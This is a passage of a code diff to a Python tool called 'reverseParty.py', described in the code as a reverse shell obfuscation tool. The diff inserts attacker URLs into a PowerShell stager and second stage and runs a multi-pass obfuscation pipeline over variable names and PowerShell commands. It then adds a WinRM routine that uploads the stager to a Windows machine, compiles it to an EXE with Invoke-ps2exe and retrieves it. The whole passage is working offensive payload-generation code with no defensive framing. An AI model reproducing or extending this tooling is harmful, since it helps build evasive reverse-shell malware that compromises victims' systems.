+    # 3c. Substitute placeholders
+    info("Substituting placeholders [ATTACKER-URL] and [SECONDNAME]...")
+    content = read_file(dest_path)
+    n_url = content.count("[ATTACKER-URL]")
+    n_sec = content.count("[SECONDNAME]")
+    content = content.replace("[ATTACKER-URL]", ATTACKER_URL)
+    content = content.replace("[SECONDNAME]",   SECONDNAME)
+    write_file(dest_path, content)
+    ok(f"Replaced {n_url} occurrence(s) of [ATTACKER-URL] → '{ATTACKER_URL}'.")
+    ok(f"Replaced {n_sec} occurrence(s) of [SECONDNAME]   → '{SECONDNAME}'.")
 
-    content = content.replace("[ATTACKER-URL]", args.attacker_url)
-    content = content.replace("[ATTACKER-SECOND-STAGE]", args.attacker_second_stage)
-    print(f"       [ATTACKER-URL]            -> {args.attacker_url}")
-    print(f"       [ATTACKER-SECOND-STAGE]   -> {args.attacker_second_stage}")
-
-    # 3d. Full obfuscation pipeline
-    print("  [*] Generating random variable name pool...")
-    print("  [*] Obfuscating variable names...")
-    print("  [*] Obfuscating PowerShell commands (Method1)...")
-    print("  [*] Obfuscating no-parameter commands (random method A/B/C)...")
-    content = full_obfuscation(content, PS_CMD_FILE, PS_CMD_NO_PARAM_FILE)
-
-    # 3e. Write obfuscated content back
-    with open(dst_path, "w", encoding="utf-8") as fh:
-        fh.write(content)
-
-    print(f"  [+] Obfuscated stager written to: {dst_path}")
-    print("[STEP 3] Stager obfuscation complete.\n")
+    # 3d. Obfuscation pipeline (2 passes)
+    info("Starting obfuscation pipeline (2 passes) on stager file...")
+    content = read_file(dest_path)
+    content = full_obfuscation_pipeline(content, label="stager")
+    write_file(dest_path, content)
+    ok(f"Stager obfuscation complete. Output: {dest_path}")
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  MAIN
-# ════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+# STEP 4 — STAGER PS1 → EXE CONVERSION VIA WINRM
+# ==============================================================================
+
+def step4_convert_stager_to_exe():
+    """
+    STEP 4: Convert the obfuscated stager PS1 to a Windows EXE via WinRM.
+
+    Actions performed:
+      4a. Check that pywinrm is installed. If not → dark-red error, skip step.
+      4b. Connect to WIN_IP via WinRM (NTLM auth). If unreachable → dark-red
+          error, skip step. Script continues regardless.
+      4c. Upload STAGERNAME from out/ to %TEMP% on Windows via Base64 transfer.
+      4d. Run Invoke-ps2exe STAGERNAME EXENAME on the remote machine.
+      4e. Download the resulting EXENAME back to local out/ via Base64 transfer.
+      4f. Clean up temporary files from Windows %TEMP%.
+
+    On any failure: print a dark-red message and return — script continues.
+    """
+    section("STEP 4 — Stager PS1 → EXE Conversion via WinRM")
+
+    stager_local = os.path.join(OUT_DIR, STAGERNAME)
+    exe_local    = os.path.join(OUT_DIR, EXENAME)
+
+    # 4a. Check pywinrm
+    if not WINRM_AVAILABLE:
+        err_nonfatal(
+            "The 'pywinrm' library is not installed. "
+            "Run: pip install pywinrm\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 4b. Connect via WinRM
+    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
+    try:
+        session = winrm.Session(
+            f"http://{WIN_IP}:5985/wsman",
+            auth=(WIN_USER, WIN_PASS),
+            transport="ntlm",
+            read_timeout_sec=30,
+            operation_timeout_sec=25,
+        )
+        result = session.run_ps("$env:COMPUTERNAME")
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        hostname = result.std_out.decode(errors="replace").strip()
+        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
+    except Exception as e:
+        err_nonfatal(
+            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 4c. Upload STAGERNAME to Windows %TEMP% via Base64
+    info(f"Uploading {STAGERNAME} to Windows %TEMP% directory...")
+    try:
+        with open(stager_local, "rb") as f:
+            file_bytes = f.read()
+        b64_content = base64.b64encode(file_bytes).decode("ascii")
+        upload_ps = (
+            f"$b64 = '{b64_content}';\n"
+            f"$bytes = [System.Convert]::FromBase64String($b64);\n"
+            f"[System.IO.File]::WriteAllBytes(\"$env:TEMP\\{STAGERNAME}\", $bytes);\n"
+            f"Write-Output 'Upload OK'"
+        )
+        result = session.run_ps(upload_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        ok(f"File {STAGERNAME} uploaded to remote %TEMP% successfully.")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to upload {STAGERNAME} to {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 4d. Run Invoke-ps2exe on remote machine
+    info(f"Running Invoke-ps2exe: {STAGERNAME} → {EXENAME}...")
+    try:
+        convert_ps = (
+            f"Invoke-ps2exe \"$env:TEMP\\{STAGERNAME}\" \"$env:TEMP\\{EXENAME}\";\n"
+            f"if (Test-Path \"$env:TEMP\\{EXENAME}\") "
+            f"{{ Write-Output 'Conversion OK' }} "
+            f"else {{ Write-Error 'EXE not created' }}"
+        )
+        result = session.run_ps(convert_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{EXENAME}")
+    except Exception as e:
+        err_nonfatal(
+            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
+            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
+            f"(Install-Module ps2exe).\n"
+            f"  The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        session.run_ps(f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0")
+        return
+
+    # 4e. Download EXENAME from Windows %TEMP% to local out/
+    info(f"Downloading {EXENAME} from Windows %TEMP% to local out/...")
+    try:
+        download_ps = (
+            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{EXENAME}\");\n"
+            f"[System.Convert]::ToBase64String($bytes)"
+        )
+        result = session.run_ps(download_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        b64_exe  = result.std_out.decode(errors="replace").strip()
+        exe_bytes = base64.b64decode(b64_exe)
+        with open(exe_local, "wb") as f:
+            f.write(exe_bytes)
+        ok(f"EXE downloaded: {exe_local} ({len(exe_bytes):,} bytes)")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to download {EXENAME} from {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The stager EXE will NOT be available locally. "
+            f"Continuing...{RESET}"
+        )
+
+    # 4f. Cleanup remote %TEMP%
+    info("Cleaning up temporary files from Windows %TEMP%...")
+    try:
+        cleanup_ps = (
+            f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0;\n"
+            f"Remove-Item \"$env:TEMP\\{EXENAME}\" -Force -EA 0;\n"
+            f"Write-Output 'Cleanup OK'"
+        )
+        session.run_ps(cleanup_ps)
+        ok("Remote temporary files cleaned up.")
+    except Exception:
+        warn("Could not clean up temporary files on the Windows machine.")
+
+
+# ==============================================================================
+# MAIN
+# ==============================================================================
 
 def main():
-    print("\n" + "=" * 70)
-    print("          reverseParty.py – Reverse Shell Obfuscation Tool")
-    print("=" * 70 + "\n")
+    banner()
+    step1_validate_variables()
+    step2_obfuscate_second_stage()
+    step3_obfuscate_stager()
+    step4_convert_stager_to_exe()
 
-    args = step1_parse_args()
-    step2_obfuscate_second_stage(args)
-    step3_obfuscate_stager(args)
-
-    print("=" * 70)
-    print("[DONE] All steps completed successfully.")
-    print(f"       Output files are located in: {OUT_DIR}")
-    print("=" * 70 + "\n")
+    section("ALL STEPS COMPLETED")
+    ok("reverseParty.py finished successfully.")
+    print()
+    info(f"Output directory : {OUT_DIR}")
+    info(f"Second stage     : {os.path.join(OUT_DIR, SECONDNAME)}")
+    info(f"Stager (PS1)     : {os.path.join(OUT_DIR, STAGERNAME)}")
+    exe_path = os.path.join(OUT_DIR, EXENAME)
+    if os.path.isfile(exe_path):
+        info(f"Stager (EXE)     : {exe_path}")
+    else:
+        warn(f"Stager (EXE)     : not generated (see Step 4 output above)")
+    print()
 
 
 if __name__ == "__main__":
